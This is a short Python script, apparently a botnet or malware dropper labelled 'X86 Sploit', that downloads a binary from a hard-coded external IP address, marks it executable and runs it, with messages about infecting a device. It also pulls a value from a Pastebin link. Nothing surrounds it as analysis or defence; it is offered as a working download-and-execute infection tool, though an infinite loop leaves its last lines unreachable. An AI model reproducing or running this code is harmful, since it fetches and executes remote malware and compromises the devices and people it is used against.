import urllib.request
import time
import requests
import os
from os import system

print("X86 Sploit Made by @0x16b X @Queered")
time.sleep(3)
print("Downloading & Uploading bins")
time.sleep(3)
urllib.request.urlretrieve("http://41.216.182.99/main","main")
time.sleep(3)
print("done downloading :)")
time.sleep(3)
print("ready to infect this hoe???")
os.system("chmod +x main; ./main sploit.x86")
while True:
  print("hi")
  time.sleep(5)
print("Device has been infected")
pastebin_raw_link = 'https://pastebin.com/raw/dxDQCHDp'
response = requests.get(pastebin_raw_link)
skid = response.content
time.sleep(int(skid))
